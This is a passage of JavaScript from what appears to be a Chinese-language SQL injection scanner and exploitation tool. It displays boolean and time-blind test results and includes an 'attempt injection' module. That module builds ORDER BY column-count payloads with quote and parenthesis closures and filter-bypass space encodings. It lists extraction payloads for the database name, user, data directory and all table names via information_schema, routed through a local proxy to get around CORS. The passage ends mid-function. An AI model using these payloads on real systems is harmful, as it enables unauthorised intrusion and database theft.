            // 清理HTML标签，只保留纯文本
            let cleanedBody = result.falseResponse.body.replace(/<[^>]*>/g, '');
            // 移除多余的空白字符
            cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
            // 保存完整的响应体内容
            falseFullResponseBody = cleanedBody;
            // 限制长度并添加省略号用于显示
            falseResponsePreview = cleanedBody.length > 100 
                ? cleanedBody.substring(0, 100) + '...' 
                : cleanedBody;
            // 如果清理后内容为空，显示提示
            if (!falseResponsePreview || falseResponsePreview === '') {
                falseResponsePreview = '空响应体';
                falseFullResponseBody = '空响应体';
            }
        } else if (result.falseResponse) {
            // 1=2测试执行了，但响应体为空
            falseResponsePreview = '空响应体';
            falseFullResponseBody = '空响应体';
        } else {
            // 1=2测试执行了，但没有响应
            falseResponsePreview = '无响应';
            falseFullResponseBody = '无响应';
        }
    } else if (result.falseResponse) {
        if (result.falseResponse.body) {
            // 清理HTML标签，只保留纯文本
            let cleanedBody = result.falseResponse.body.replace(/<[^>]*>/g, '');
            // 移除多余的空白字符
            cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
            // 保存完整的响应体内容
            falseFullResponseBody = cleanedBody;
            // 限制长度并添加省略号用于显示
            falseResponsePreview = cleanedBody.length > 100 
                ? cleanedBody.substring(0, 100) + '...' 
                : cleanedBody;
            // 如果清理后内容为空，显示提示
            if (!falseResponsePreview || falseResponsePreview === '') {
                falseResponsePreview = '空响应体';
                falseFullResponseBody = '空响应体';
            }
        } else {
            // 1=2测试执行了，但响应体为空
            falseResponsePreview = '空响应体';
            falseFullResponseBody = '空响应体';
        }
    } else {
        // 1=2测试没有执行，显示测试未执行
        falseResponsePreview = '测试未执行';
        falseFullResponseBody = '测试未执行';
    }
    
    // 注释变体英文到中文的映射
    const commentVariantMap = {
        'no_comment': '不带注释',
        'double_dash': '双横线注释',
        'double_dash_plus': '双横线+注释',
        'hash': '井号注释',
        'multi_line': '多行注释',
        'inline': '内联注释',
        'double_dash_space': '双重注释'
    };
    
    // 空格替代英文到中文的映射
    const spaceReplacementMap = {
        'none': '无（正常空格）',
        'tab': 'Tab制表符',
        'newline': '换行符',
        'comment': '注释空格',
        'plus': '加号连接'
    };
    
    // 时间盲注英文到中文的映射
    const blindTechniqueMap = {
        'time_blind_mysql': '时间盲注MySQL',
        'time_blind_pg': '时间盲注PostgreSQL',
        'time_blind_mssql': '时间盲注SQLServer'
    };
    
    // 判断时间盲注
    let blindTechnique = '无';
    
    // 优先使用测试用例对象本身的blindTechnique属性，并转换为中文
    if (result.testCase.blindTechnique) {
        blindTechnique = blindTechniqueMap[result.testCase.blindTechnique] || result.testCase.blindTechnique;
    } else if (result.testCase.name.includes('时间盲注MySQL')) {
        blindTechnique = '时间盲注MySQL';
    } else if (result.testCase.name.includes('时间盲注PostgreSQL')) {
        blindTechnique = '时间盲注PostgreSQL';
    } else if (result.testCase.name.includes('时间盲注SQLServer')) {
        blindTechnique = '时间盲注SQLServer';
    } else if (result.testCase.name.includes('time_blind_pg')) {
        blindTechnique = '时间盲注PostgreSQL';
    } else if (result.testCase.name.includes('time_blind_mssql')) {
        blindTechnique = '时间盲注SQLServer';
    } else if (result.testCase.name.includes('time_blind')) {
        blindTechnique = '时间盲注MySQL';
    }
    
    // 确保时间盲注显示为'无'而不是其他默认值
    if (blindTechnique === 'N/A' || blindTechnique === '' || blindTechnique === undefined) {
        blindTechnique = '无';
    }
    
    // 先声明所有变量，避免ReferenceError
    let commentVariant = '-';
    let spaceReplacement = 'none';
    let fieldWrapper = '-';
    let logicOperator = '未知';
    

    // 1. 首先，根据测试用例的payload识别注释变体
    const payload = result.testCase.payload;
    let detectedCommentVariant = 'no_comment';
    
    if (payload.includes(' -- ')) {
        detectedCommentVariant = 'double_dash';
    } else if (payload.includes(' --+')) {
        detectedCommentVariant = 'double_dash_plus';
    } else if (payload.includes(' #')) {
        detectedCommentVariant = 'hash';
    } else if (payload.includes(' /*')) {
        if (payload.includes('/*!')) {
            detectedCommentVariant = 'inline';
        } else {
            detectedCommentVariant = 'multi_line';
        }
    } else if (payload.includes(' -- -')) {
        detectedCommentVariant = 'double_dash_space';
    }
        
    // 2. 将检测到的注释变体映射为中文
    commentVariant = commentVariantMap[detectedCommentVariant] || '不带注释';
    
    // 3. 如果测试用例本身有commentVariant属性，优先使用
    if (result.testCase.commentVariant) {
        // 检查是否已经是中文名称
        if (Object.values(commentVariantMap).includes(result.testCase.commentVariant)) {
            commentVariant = result.testCase.commentVariant;
        } 
        // 如果是英文键名，映射为中文
        else if (commentVariantMap[result.testCase.commentVariant]) {
            commentVariant = commentVariantMap[result.testCase.commentVariant];
        }
    }
    
    // 4. 处理注释变体测试用例的特殊情况
    if (result.testCase.name.includes('注释变体-')) {
        commentVariant = result.testCase.commentVariant || result.testCase.name.replace('注释变体-', '');
    }
    
    // 统一显示：将"无"和"-"都改为"不带注释"
    if (commentVariant === '无' || commentVariant === '-') {
        commentVariant = '不带注释';
    }
    
    // 获取空格替代类型
    spaceReplacement = result.testCase.spaceReplacement || 'none';
    // 将英文空格替代映射为中文
    spaceReplacement = spaceReplacementMap[spaceReplacement] || spaceReplacement;
    
    // 获取字段包裹符类型
    fieldWrapper = result.testCase.wrapperType || '-';
    if (result.testCase.name.includes('字段包裹符-')) {
        fieldWrapper = result.testCase.wrapperType || result.testCase.name.replace('字段包裹符-', '');
    }
    
    // 获取逻辑运算符
    // 优先使用测试用例对象的logicOperator属性
    if (result.testCase.logicOperator) {
        if (result.testCase.logicOperator === 'none') {
            logicOperator = '无';
        } else {
            // 逻辑运算符内部表示到实际符号的映射
            const operatorMap = {
                'and': 'AND',
                'or': 'OR',
                'and_double_ampersand': '&&',
                'or_double_pipe': '||',
                'not_equal': '<>',
                'like': 'LIKE',
                'in': 'IN',
                'regexp': 'REGEXP'
            };
            logicOperator = operatorMap[result.testCase.logicOperator] || result.testCase.logicOperator || '无';
        }
    } else {
        // 从测试用例名称中提取逻辑运算符
        if (result.testCase.name.includes('AND')) {
            logicOperator = 'AND';
        } else if (result.testCase.name.includes('OR')) {
            logicOperator = 'OR';
        } else if (result.testCase.name.includes('&&')) {
            logicOperator = '&&';
        } else if (result.testCase.name.includes('||')) {
            logicOperator = '||';
        } else if (result.testCase.name.includes('不等于')) {
            logicOperator = '<>';
        } else if (result.testCase.name.includes('LIKE')) {
            logicOperator = 'LIKE';
        } else if (result.testCase.name.includes('IN')) {
            logicOperator = 'IN';
        } else if (result.testCase.name.includes('REGEXP')) {
            logicOperator = 'REGEXP';
        } else {
            // 从payload中提取逻辑运算符
            if (payload.includes(' AND ')) {
                logicOperator = 'AND';
            } else if (payload.includes(' OR ')) {
                logicOperator = 'OR';
            } else if (payload.includes(' && ')) {
                logicOperator = '&&';
            } else if (payload.includes(' || ')) {
                logicOperator = '||';
            } else if (payload.includes(' <> ')) {
                logicOperator = '<>';
            } else if (payload.includes(' LIKE ')) {
                logicOperator = 'LIKE';
            } else if (payload.includes(' IN ')) {
                logicOperator = 'IN';
            } else if (payload.includes(' REGEXP ')) {
                logicOperator = 'REGEXP';
            } else {
                logicOperator = '无';
            }
        }
    }
    
    // 构建注入原型显示
    let injectionPrototype = '';
    if (result.config.requestMethod === 'POST') {
        // 对于POST请求，直接显示参数名和值，与GET保持一致
        injectionPrototype = `${result.param.key}=${result.testCase.payload}`;
    } else {
        // 对于GET请求，显示参数名和值
        injectionPrototype = `${result.param.key}=${result.testCase.payload}`;
    }
    
    // 构建请求主体显示
    let requestBody = '';
    if (result.config.requestMethod === 'POST') {
        // 对于POST请求，显示完整的POST数据
        requestBody = result.postData || 'N/A';
    } else {
        // 对于GET请求，显示URL查询参数
        try {
            const url = new URL(result.testUrl);
            requestBody = url.search ? url.search.substring(1) : 'N/A';
        } catch (e) {
            // 如果URL解析失败，尝试从原始URL中提取查询字符串
            const queryStartIndex = result.testUrl.indexOf('?');
            requestBody = queryStartIndex !== -1 ? result.testUrl.substring(queryStartIndex + 1) : 'N/A';
        }
    }
    
    // 生成URL解码列的内容
    let decodedUrl = result.testUrl;
    try {
        // 解析URL
        const url = new URL(result.testUrl);
        
        // 解码URL的各个部分，然后手动构建完整的解码URL
        const protocol = url.protocol;
        const host = url.host;
        const pathname = url.pathname;
        
        // 解码查询参数部分
        let decodedQuery = '';
        const params = new URLSearchParams(url.search);
        
        // 逐个解码查询参数
        let paramIndex = 0;
        for (const [key, value] of params.entries()) {
            // 解码键和值，包括%09、%0A和%27等特殊字符
            let decodedKey = key;
            let decodedValue = value;
            
            try {
                // 使用自定义解码函数处理特殊字符
                decodedKey = customUrlDecode(key);
                decodedValue = customUrlDecode(value);
            } catch (e) {
                // 如果解码失败，保留原始值
            }
            
            // 手动构建查询字符串，不需要重新编码，直接使用解码后的值
            if (paramIndex > 0) {
                decodedQuery += '&';
            }
            decodedQuery += `${decodedKey}=${decodedValue}`;
            paramIndex++;
        }
        
        // 构建完整的解码URL
        decodedUrl = `${protocol}//${host}${pathname}${decodedQuery ? '?' + decodedQuery : ''}`;
    } catch (e) {
        // 如果所有解码尝试都失败，使用原始URL
        decodedUrl = result.testUrl;
    }
    // 保存解码后的URL到result对象，供筛选使用
    result.decodedUrl = decodedUrl;
    const displayDecodedUrl = decodedUrl.length > 100 ? decodedUrl.substring(0, 100) + '...' : decodedUrl;
    
    row.innerHTML = `
        <td>${displayIndex + 1}</td>
        <td class="result-url" style="word-break: break-all;">
            <a href="${result.testUrl}" target="_blank" rel="noopener noreferrer">${displayUrl}</a>
        </td>
        <td class="result-decoded-url" style="word-break: break-all;">
            <a href="${decodedUrl}" target="_blank" rel="noopener noreferrer">${displayDecodedUrl}</a>
        </td>
        <td style="font-family: monospace; overflow: visible; text-overflow: unset; white-space: pre-wrap; word-wrap: break-word;">
            ${requestBody}
        </td>
        <td class="injection-prototype" style="font-family: monospace;">
            ${injectionPrototype}
        </td>
        <td>${result.param.key}</td>
        <td>${commentVariant}</td>
        <td>${spaceReplacement}</td>
        <td>${fieldWrapper}</td>
        <td>${logicOperator}</td>
        <td>${blindTechnique}</td>
        <td>${result.response ? result.response.status : 'N/A'}</td>
        <td>${result.responseTime}ms</td>
        <td>${result.falseResponseTime || 'N/A'}ms</td>
        <td>${contentLength}</td>
        <td class="response-preview" style="font-family: monospace; overflow: hidden; text-overflow: ellipsis; white-space: pre-wrap; word-wrap: break-word; max-width: 200px;" data-full-content="${fullResponseBody}">
            ${responsePreview}
        </td>
        <td class="response-preview" style="font-family: monospace; overflow: hidden; text-overflow: ellipsis; white-space: pre-wrap; word-wrap: break-word; max-width: 200px;" data-full-content="${falseFullResponseBody}">
            ${falseResponsePreview}
        </td>
        <td>${result.lengthsMatch ? '<span class="badge badge-positive">是</span>' : '<span class="badge badge-negative">否</span>'}</td>
        <td>${result.contentsMatch ? '<span class="badge badge-positive">是</span>' : '<span class="badge badge-negative">否</span>'}</td>
        <td>${statusBadges[result.result.status]}</td>
        <td>${riskLabels[result.result.riskLevel]}</td>
        <td>
            <div class="result-actions">
                <button class="btn btn-info btn-sm" onclick="viewResultDetail(${displayIndex})" title="查看详情">
                    <i class="fa fa-eye" aria-hidden="true"></i>
                </button>
                <button class="btn btn-success btn-sm" onclick="copyTestUrl(${displayIndex})" title="复制URL">
                    <i class="fa fa-copy" aria-hidden="true"></i>
                </button>
                <button class="btn btn-primary btn-sm" onclick="attemptInjection(${displayIndex})" title="尝试注入">
                    <i class="fa fa-terminal" aria-hidden="true"></i>
                </button>
            </div>
        </td>
    `;
    
    tableBody.appendChild(row);
    
    // 如果是注入点发现，自动生成语法
    if (result.result.status === 'positive' || result.result.status === 'warning') {
        generateTargetedSyntax(result);
    }
}

// 查看结果详情
function viewResultDetail(index) {
    const result = testResults[index];
    if (!result) return;
    
    const modal = new bootstrap.Modal(document.getElementById('resultDetailModal'));
    const detailContent = document.querySelector('.detail-content');
    
    // 构建详情HTML
    let detailHtml = `
        <div class="detail-section">
            <h6><i class="fa fa-info-circle" aria-hidden="true"></i> 测试基本信息</h6>
            <p><strong>URL:</strong> <a href="${result.testUrl}" target="_blank" rel="noopener noreferrer">${result.testUrl}</a></p>
            <p><strong>参数:</strong> ${result.param.key}=${result.param.value}</p>
            <p><strong>注入类型:</strong> ${injectionTypeNames[result.injectionType] || result.injectionType}</p>
            <p><strong>测试用例:</strong> ${result.testCase.name}</p>
            <p><strong>1=1 Payload:</strong> <code>${result.testCase.payload}</code></p>
            ${result.testCase.falsePayload ? `<p><strong>1=2 Payload:</strong> <code>${result.testCase.falsePayload}</code></p>` : ''}
            <p><strong>1=1 结果:</strong> ${result.result.message}</p>
            ${result.falseResult ? `<p><strong>1=2 结果:</strong> ${result.falseResult.message}</p>` : ''}
            <p><strong>风险等级:</strong> ${result.result.riskLevel === 'high' ? '高风险' : result.result.riskLevel === 'medium' ? '中风险' : '低风险'}</p>
            <p><strong>1=1 响应时间:</strong> ${result.responseTime}ms</p>
            ${result.falseResponseTime ? `<p><strong>1=2 响应时间:</strong> ${result.falseResponseTime}ms</p>` : ''}
            ${result.blindInjectionResult ? `<p><strong>布尔盲注检测结果:</strong> ${result.blindInjectionResult}</p>` : ''}
            <p><strong>1=1和1=2长度是否一致:</strong> <span class="consistency-result">${result.lengthsMatch ? '是' : '否'}</span></p>
            <p><strong>1=1和1=2内容是否一致:</strong> <span class="consistency-result">${result.contentsMatch ? '是' : '否'}</span></p>
        </div>
        
        <div class="detail-section">
            <h6><i class="fa fa-list" aria-hidden="true"></i> 完整请求参数</h6>
            <pre>`;
    
    // 只添加SQL注入测试参数（POST数据）
    if (result.postData) {
        detailHtml += result.postData;
    } else if (result.params) {
        // 如果没有POST数据，显示GET参数
        const paramsArray = [];
        for (const [key, value] of Object.entries(result.params)) {
            paramsArray.push(`${key}=${value}`);
        }
        detailHtml += paramsArray.join('&');
    }
    
    detailHtml += `</pre>
        </div>
    `;
    
    // 添加1=1响应信息
    if (result.response) {
        detailHtml += `
            <div class="detail-section">
                <h6><i class="fa fa-check-circle" aria-hidden="true"></i> 1=1 响应信息</h6>
                <p><strong>状态码:</strong> ${result.response.status} ${result.response.statusText}</p>
                <p><strong>响应头:</strong></p>
                <pre>${JSON.stringify(Object.fromEntries(result.response.headers), null, 2)}</pre>
                <p><strong>响应体:</strong></p>
                <div class="response-preview-container">
                    <iframe class="response-preview-frame" sandbox="allow-same-origin allow-scripts allow-styles" title="1=1响应体预览"></iframe>
                </div>
            </div>
        `;
    }
    
    // 添加1=2响应信息
    if (result.falseResponse) {
        detailHtml += `
            <div class="detail-section">
                <h6><i class="fa fa-times-circle" aria-hidden="true"></i> 1=2 响应信息</h6>
                <p><strong>状态码:</strong> ${result.falseResponse.status} ${result.falseResponse.statusText}</p>
                <p><strong>响应头:</strong></p>
                <pre>${JSON.stringify(Object.fromEntries(result.falseResponse.headers), null, 2)}</pre>
                <p><strong>响应体:</strong></p>
                <div class="response-preview-container">
                    <iframe class="response-preview-frame" sandbox="allow-same-origin allow-scripts allow-styles" title="1=2响应体预览"></iframe>
                </div>
            </div>
        `;
    }
    
    // 更新详情内容
    detailContent.innerHTML = detailHtml;
    
    // 填充iframe内容
    if (result.response) {
        const iframe1 = detailContent.querySelector('.detail-section:nth-of-type(3) .response-preview-frame');
        if (iframe1) {
            const doc1 = iframe1.contentDocument || iframe1.contentWindow.document;
            doc1.open();
            doc1.write(result.response.body);
            doc1.close();
        }
    }
    
    if (result.falseResponse) {
        const iframe2 = detailContent.querySelectorAll('.response-preview-frame')[1];
        if (iframe2) {
            const doc2 = iframe2.contentDocument || iframe2.contentWindow.document;
            doc2.open();
            doc2.write(result.falseResponse.body);
            doc2.close();
        }
    }
    
    // 显示模态框
    modal.show();
}

// 复制测试URL
function copyTestUrl(index) {
    const result = testResults[index];
    if (!result) return;
    
    copyToClipboard(result.testUrl);
    showToast('测试URL已复制到剪贴板！', 'success');
}

// 为位置信息项添加事件监听
function addPositionInfoEventListeners() {
    const positionItems = document.querySelectorAll('.position-info-item');
    positionItems.forEach(item => {
        const infoSelect = item.querySelector('select:nth-child(2)');
        const tableFieldInputs = item.querySelector('.table-field-inputs');
        
        // 添加信息选择变化事件监听
        infoSelect.addEventListener('change', function() {
            if (this.value === 'get_table_columns' || this.value === 'get_table_data') {
                tableFieldInputs.style.display = 'block';
            } else {
                tableFieldInputs.style.display = 'none';
            }
        });
        
        // 初始化显示状态
        if (infoSelect.value === 'get_table_columns' || infoSelect.value === 'get_table_data') {
            tableFieldInputs.style.display = 'block';
        } else {
            tableFieldInputs.style.display = 'none';
        }
    });
}

// 从测试结果跳转到尝试注入模态框
function attemptInjection(index) {
    const result = testResults[index];
    if (!result) return;
    
    // 保存当前结果到全局变量，方便模态框使用
    window.currentInjectionResult = result;
    
    // 显示当前选择的测试结果的配置信息
    document.getElementById('selectedTestUrl').textContent = result.testUrl || '--';
    document.getElementById('selectedRequestMethod').textContent = result.config.requestMethod || '--';
    document.getElementById('selectedInjectionParam').textContent = `${result.param.key} = ${result.param.value}` || '--';
    
    // 注释变体英文到中文的映射
    const commentVariantMap = {
        'no_comment': '不带注释',
        'double_dash': '双横线注释',
        'double_dash_plus': '双横线+注释',
        'hash': '井号注释',
        'multi_line': '多行注释',
        'inline': '内联注释',
        'double_dash_space': '双重注释'
    };
    
    // 空格替代英文到中文的映射
    const spaceReplacementMap = {
        'none': '无（正常空格）',
        'tab': 'Tab制表符',
        'newline': '换行符',
        'comment': '注释空格',
        'plus': '加号连接'
    };
    
    // 逻辑运算符内部表示到实际符号的映射
    const operatorMap = {
        'none': '无',
        'and': 'AND',
        'or': 'OR',
        'and_double_ampersand': '&&',
        'or_double_pipe': '||',
        'not_equal': '<>',
        'like': 'LIKE',
        'in': 'IN',
        'regexp': 'REGEXP'
    };
    
    // 时间盲注英文到中文的映射
    const blindTechniqueMap = {
        'time_blind_mysql': '时间盲注MySQL',
        'time_blind_pg': '时间盲注PostgreSQL',
        'time_blind_mssql': '时间盲注SQLServer',
        '无': '无'
    };
    
    // 显示格式化后的配置信息
    document.getElementById('selectedCommentVariant').textContent = commentVariantMap[result.testCase.commentVariant] || result.testCase.commentVariant || '--';
    document.getElementById('selectedFieldWrapper').textContent = result.testCase.wrapperType || '--';
    document.getElementById('selectedSpaceReplacement').textContent = spaceReplacementMap[result.testCase.spaceReplacement] || result.testCase.spaceReplacement || '--';
    
    // 处理逻辑运算符显示
    let displayLogicOperator = '无';
    if (result.testCase.logicOperator) {
        if (result.testCase.logicOperator === 'none') {
            displayLogicOperator = '无';
        } else {
            displayLogicOperator = operatorMap[result.testCase.logicOperator] || result.testCase.logicOperator || '无';
        }
    } else {
        // 从测试用例名称中提取逻辑运算符
        const payload = result.testCase.payload;
        const testCaseName = result.testCase.name;
        if (testCaseName.includes('AND') || payload.includes(' AND ')) {
            displayLogicOperator = 'AND';
        } else if (testCaseName.includes('OR') || payload.includes(' OR ')) {
            displayLogicOperator = 'OR';
        } else if (testCaseName.includes('&&') || payload.includes(' && ')) {
            displayLogicOperator = '&&';
        } else if (testCaseName.includes('||') || payload.includes(' || ')) {
            displayLogicOperator = '||';
        } else if (testCaseName.includes('不等于') || payload.includes(' <> ')) {
            displayLogicOperator = '<>';
        } else if (testCaseName.includes('LIKE') || payload.includes(' LIKE ')) {
            displayLogicOperator = 'LIKE';
        } else if (testCaseName.includes('IN') || payload.includes(' IN ')) {
            displayLogicOperator = 'IN';
        } else if (testCaseName.includes('REGEXP') || payload.includes(' REGEXP ')) {
            displayLogicOperator = 'REGEXP';
        }
    }
    document.getElementById('selectedLogicOperator').textContent = displayLogicOperator;
    
    // 处理时间盲注显示
    document.getElementById('selectedBlindTechnique').textContent = blindTechniqueMap[result.testCase.blindTechnique] || result.testCase.blindTechnique || '无';
    
    // 清空之前的尝试注入信息
    // 1. 清空注入结果列表
    const injectionResultsList = document.getElementById('injectionResultsList');
    injectionResultsList.innerHTML = '';
    
    // 2. 隐藏注入结果区域
    const injectionResults = document.getElementById('injectionResults');
    injectionResults.style.display = 'none';
    
    // 3. 清空字段数量结果列表
    const fieldCountResultsList = document.getElementById('fieldCountResultsList');
    if (fieldCountResultsList) {
        fieldCountResultsList.innerHTML = '';
        // 隐藏字段数量结果区域
        const fieldCountResults = document.getElementById('fieldCountResults');
        if (fieldCountResults) {
            fieldCountResults.style.display = 'none';
        }
    }
    
    // 4. 清空显示位置结果列表
    const displayPositionResultsList = document.getElementById('displayPositionResultsList');
    if (displayPositionResultsList) {
        displayPositionResultsList.innerHTML = '';
        // 隐藏显示位置结果区域
        const displayPositionResults = document.getElementById('displayPositionResults');
        if (displayPositionResults) {
            displayPositionResults.style.display = 'none';
        }
    }
    
    // 5. 清空右侧详细结果区域
    document.getElementById('injectionUrl').value = '';
    document.getElementById('injectionDecodedUrl').value = '';
    document.getElementById('injectionPostParams').value = '';
    document.getElementById('injectionDecodedPostParams').value = '';
    document.getElementById('injectionStatus').value = '';
    document.getElementById('injectionTime').value = '';
    document.getElementById('injectionResponse').value = '';
    
    // 6. 清空渲染页面
    const iframe = document.getElementById('injectionRenderFrame');
    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
    iframeDoc.open();
    iframeDoc.write('');
    iframeDoc.close();
    
    // 打开尝试注入模态框
    const modal = new bootstrap.Modal(document.getElementById('tryInjectionModal'));
    modal.show();
    
    // 为位置信息项添加事件监听
    addPositionInfoEventListeners();
    
    showToast('已打开尝试注入界面！', 'success');
}

// 添加位置信息
function addPositionInfo() {
    const positionInfoList = document.getElementById('positionInfoList');
    const positionItems = positionInfoList.querySelectorAll('.position-info-item');
    const currentMaxPosition = Math.max(...Array.from(positionItems).map(item => {
        const select = item.querySelector('select:first-child');
        return parseInt(select.value);
    }), 0);
    
    const newItem = document.createElement('div');
    newItem.className = 'position-info-item mb-2';
    
    // 生成位置1-10的完整选项
    let positionOptions = '';
    for (let i = 1; i <= 10; i++) {
        positionOptions += `<option value="${i}" ${i === currentMaxPosition + 1 ? 'selected' : ''}>位置 ${i}</option>`;
    }
    
    newItem.innerHTML = `
        <div class="d-flex align-items-center">
            <select class="form-select form-select-sm me-2" style="width: 100px;">
                ${positionOptions}
            </select>
            <select class="form-select form-select-sm me-2" style="flex: 1;">
                <option value="database()">数据库名</option>
                <option value="version()">数据库版本</option>
                <option value="user()">当前数据库用户</option>
                <option value="@@datadir">数据库存储路径</option>
                <option value="@@version_compile_os">操作系统</option>
                <option value="(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())">获取所有表名</option>
                <option value="get_table_columns">获取表字段名</option>
                <option value="get_table_data">获取表字段数据</option>
            </select>
            <button class="btn btn-danger btn-sm" onclick="removePositionInfo(this)">
                <i class="fa fa-trash"></i>
            </button>
        </div>
        <!-- 表名和字段名输入框，默认隐藏 -->
        <div class="table-field-inputs mt-2 ms-4" style="display: none;">
            <div class="d-flex align-items-center">
                <input type="text" class="form-control form-control-sm me-2" placeholder="目标表名 (默认: users)" style="width: 150px;" value="users">
                <input type="text" class="form-control form-control-sm me-2" placeholder="目标字段名 (可选)" style="width: 150px;">
                <small class="text-muted">仅在获取表字段数据时需要填写字段名</small>
            </div>
        </div>
    `;
    
    // 添加信息选择变化事件监听
    const infoSelect = newItem.querySelector('select:nth-child(2)');
    const tableFieldInputs = newItem.querySelector('.table-field-inputs');
    infoSelect.addEventListener('change', function() {
        if (this.value === 'get_table_columns' || this.value === 'get_table_data') {
            tableFieldInputs.style.display = 'block';
        } else {
            tableFieldInputs.style.display = 'none';
        }
    });
    
    positionInfoList.appendChild(newItem);
}

// 删除位置信息
function removePositionInfo(btn) {
    const positionInfoList = document.getElementById('positionInfoList');
    const positionItems = positionInfoList.querySelectorAll('.position-info-item');
    if (positionItems.length > 1) {
        btn.closest('.position-info-item').remove();
    } else {
        showToast('至少需要保留一个位置信息！', 'warning');
    }
}

// 确定字段数
async function runFieldCount() {
    const fieldCount = parseInt(document.getElementById('fieldCount').value);
    const result = window.currentInjectionResult;
    if (!result) return;
    
    // 清空之前的结果列表
    const fieldCountResultsList = document.getElementById('fieldCountResultsList');
    fieldCountResultsList.innerHTML = '';
    
    // 显示结果列表区域
    const fieldCountResults = document.getElementById('fieldCountResults');
    fieldCountResults.style.display = 'block';
    
    // 创建一个数组来存储所有测试结果
    const allResults = [];
    
    // 一次性执行所有order by注入
    for (let i = 1; i <= fieldCount; i++) {
        // 优先使用当前测试用例的注释变体和空格替代策略
        const commentVariant = result.testCase.commentVariant || 'double_dash_plus';
        // 使用当前测试用例的空格替代策略，如果没有则使用默认值
        const spaceReplacement = result.testCase.spaceReplacement || 'none';
        
        // 根据注释变体生成注释后缀
        const commentSuffix = commentVariant !== 'no_comment' ? {
            'double_dash': ' -- ',
            'double_dash_plus': ' --+',
            'hash': ' #',
            'multi_line': ' /*注释*/',
            'inline': ' /*!SQL注入测试*/',
            'double_dash_space': ' -- -'
        }[commentVariant] || ' -- ' : '';
        
        // 构建注入URL
        // 获取当前结果的字段包裹符和注入类型
        const wrapperType = result.testCase.wrapperType || '无';
        const injectionType = result.testCase.injectionType || 'numeric';
        
        // 根据字段包裹符和注入类型构建正确的payload前缀
        // 优先考虑wrapperType，而不是injectionType
        // 先检查具体的组合包裹符，再检查单一包裹符，最后基于注入类型判断
        let payloadPrefix = '';
        
        // 先检查具体的组合包裹符
        if (wrapperType === '单引号+小括号') {
            // 单引号+小括号，添加单引号和右括号闭合
            payloadPrefix = "1')";
        } else if (wrapperType === '单引号+小括号+小括号') {
            // 单引号+双小括号，添加单引号和两个右括号闭合
            payloadPrefix = "1'))";
        } else if (wrapperType === '双引号+小括号') {
            // 双引号+小括号，添加双引号和右括号闭合
            payloadPrefix = '1")';
        } else if (wrapperType === '双引号+小括号+小括号') {
            // 双引号+双小括号，添加双引号和两个右括号闭合
            payloadPrefix = '1"))';
        } else if (wrapperType === '小括号+小括号') {
            // 双小括号包裹符，添加两个右括号闭合
            payloadPrefix = '1))';
        } else if (wrapperType === '小括号') {
            // 小括号包裹符，添加右括号闭合
            payloadPrefix = '1)';
        } else if (wrapperType === '单引号') {
            // 单引号包裹符，添加单引号闭合
            payloadPrefix = "1'";
        } else if (wrapperType === '双引号') {
            // 双引号包裹符，添加双引号闭合
            payloadPrefix = '1"';
        } else if (wrapperType === '反引号') {
            // 反引号包裹符，添加反引号闭合
            payloadPrefix = '1`';
        } else if (wrapperType === '无' && injectionType === 'numeric') {
            // 只有当wrapperType为'无'且injectionType为numeric时，才使用纯数字
            payloadPrefix = '1';
        } else if (injectionType.includes('single')) {
            // 基于注入类型的单引号闭合
            payloadPrefix = "1'";
        } else if (injectionType.includes('double')) {
            // 基于注入类型的双引号闭合
            payloadPrefix = '1"';
        } else if (injectionType.includes('backtick')) {
            // 基于注入类型的反引号闭合
            payloadPrefix = '1`';
        } else {
            // 其他情况，使用原始payload的第一个部分
            payloadPrefix = result.testCase.payload.split(' ')[0];
        }
        
        const payload = `${payloadPrefix} order by ${i}${commentSuffix}`;
        let testUrl, testBody;
        
        // 根据请求方法构建请求
        if (result.config.requestMethod === 'POST') {
            // POST请求：使用原始URL，在请求体中注入参数
            testUrl = result.url;
            // 构建包含注入payload的POST数据，使用正确的空格编码策略
            testBody = buildPostDataForTest(result.postData, result.param.key, payload, spaceReplacement);
        } else {
            // GET请求：在URL中注入参数
            testUrl = buildTestUrl({
                url: result.url,
                param: result.param,
                testCase: { payload, spaceReplacement },
                config: result.config,
                params: result.params
            });
            testBody = undefined;
        }
        
        // 执行请求（通过代理服务器绕过CORS限制）
        const startTime = Date.now();
        try {
            // 使用代理服务器转发请求
            const proxyUrl = `http://localhost:3001/proxy?url=${encodeURIComponent(testUrl)}`;
            const response = await fetch(proxyUrl, {
                method: result.config.requestMethod,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: testBody
            });
            const endTime = Date.now();
            const responseBody = await response.text();
            
            // 保存结果
            const testResult = {
                url: testUrl,
                status: `${response.status} ${response.statusText}`,
                time: `${endTime - startTime}ms`,
                body: responseBody,
                success: true
            };
            allResults.push(testResult);
            
            // 添加到结果列表
            const listItem = document.createElement('a');
            listItem.href = '#';
            listItem.className = 'list-group-item list-group-item-action list-group-item-success';
            // 显示实际使用的payload，包含正确的字段包裹符和空格替代
            const rawPayload = `${payloadPrefix} order by ${i}${commentSuffix}`;
            // 应用空格替代策略
            const spaceEncodingStrategies = {
                'none': (text) => text,  // 保持原样（默认）
                'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
                'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
                'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为SQL注释
                'plus': (text) => text.replace(/ /g, '+')  // 空格替换为+符号
            };
            const displayPayload = `?${result.param.key}=${spaceEncodingStrategies[spaceReplacement](rawPayload)}`;
            listItem.innerHTML = `
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <h6 class="mb-1">${displayPayload}</h6>
                        <small>${testResult.status} · ${testResult.time}</small>
                    </div>
                    <span class="badge bg-success">成功</span>
                </div>
            `;
            
            // 添加点击事件，显示详细结果
            listItem.addEventListener('click', () => {
                document.getElementById('injectionUrl').value = testResult.url;
                // 显示URL解码
                const decodedUrl = customUrlDecode(testResult.url);
                document.getElementById('injectionDecodedUrl').value = decodedUrl;
                // 显示POST参数
                document.getElementById('injectionPostParams').value = testBody || '';
                // 显示POST参数URL解码
                document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
                document.getElementById('injectionStatus').value = testResult.status;
                document.getElementById('injectionTime').value = testResult.time;
                document.getElementById('injectionResponse').value = testResult.body;
                
                // 更新渲染页面
                const iframe = document.getElementById('injectionRenderFrame');
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
